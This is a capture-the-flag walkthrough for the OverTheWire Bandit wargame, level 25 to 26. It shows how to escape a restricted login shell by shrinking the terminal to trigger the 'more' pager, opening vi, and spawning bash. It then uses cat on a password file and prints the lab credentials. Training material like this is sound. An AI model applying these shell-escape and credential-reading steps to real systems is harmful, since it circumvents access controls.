🎯 Objective:
       You can’t log in normally because the shell exits immediately.
       You must escape from a restricted shell using more and get the password.

Steps to be followed:

Step 1: Login as bandit25 (with private key). Bandit25 gives you an SSH key.

ssh bandit25@bandit.labs.overthewire.org -p 2220
Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Step 2: List files

Command: ls
Output: bandit26.sshkey

Step 3: Try logging in as bandit26

Command: ssh -i bandit26.sshkey bandit26@localhost -p 2220

⚠️ You’ll get logged out immediately — this is expected.

Step 4: Exploit terminal size (important!)

Make your terminal very small (shrink the window).
Then run again:
       ssh -i bandit26.sshkey bandit26@localhost -p 2220

Now it opens a more pager instead of exiting.

Step 5: Escape from more

Inside more, press: v
This opens vi editor.

Step 6: Spawn a shell from vi

Inside vi, type:
      :set shell=/bin/bash
      :shell

You now have a shell as bandit26

Step 7: Read the password

Command: cat /etc/bandit_pass/bandit26

Output:

Password for Level 26: 5czgV9L3X0a0n6uD9wJm9xS5dK0gFq8P
